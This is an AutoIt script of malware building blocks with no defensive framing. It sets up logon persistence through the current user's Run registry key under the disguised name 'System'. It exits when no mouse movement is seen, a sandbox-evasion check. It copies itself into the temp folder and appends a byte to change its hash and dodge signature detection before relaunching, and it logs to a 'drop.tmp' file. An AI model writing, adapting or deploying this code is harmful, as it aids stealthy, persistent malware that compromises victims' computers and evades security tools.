#include <MsgBoxConstants.au3>
#include <FileConstants.au3>
#include <WinAPIFiles.au3>

;Get the exe persistent for current user
Func SetPersistent4CurrentUser()
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
EndFunc

Func MessageBox($title, $text)
   MsgBox($MB_SYSTEMMODAL, $title, $text , 10)
EndFunc

Func Log2File($log)
    ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
	Local Const $sFilePath = @TempDir & "\drop.tmp"
    Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
	   If $hFileOpen = -1 Then
		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
		   Return False
	   EndIf
    FileWrite($hFileOpen, $log & @CRLF)
    FileClose($hFileOpen)
 EndFunc

Func DetectMouseMoving()
   Local $MousePos = MouseGetPos()
   Local $hTimer = TimerInit()
   while 1
	  If $MousePos[0] <> MouseGetPos()[0] Then
		 Return 1
	  EndIf
	  if TimerDiff($hTimer) > 5000 Then
		  MsgBox($MB_SYSTEMMODAL, "", ":(")
		 Exit
	  EndIf
   WEnd
EndFunc

;copy myself into temp changing hash
Func CopyTempRun()
   FileCopy(@ScriptDir & "\" & @ScriptName, @TempDir & "\" & @ScriptName, $FC_OVERWRITE + $FC_CREATEPATH)
   Local $hFileOpen = FileOpen(@TempDir & "\" & @ScriptName, $FO_APPEND)
   If $hFileOpen = -1 Then
	  Return False
   EndIf
   FileWriteLine($hFileOpen, "1")
   FileClose($hFileOpen)
   RunWait(@TempDir & "\" & @ScriptName);
EndFunc

Func isRunningFromTemp()
   if (@ScriptDir & "\" & @ScriptName == @TempDir & "\" & @ScriptName) Then
	  Return 1
   EndIf
EndFunc

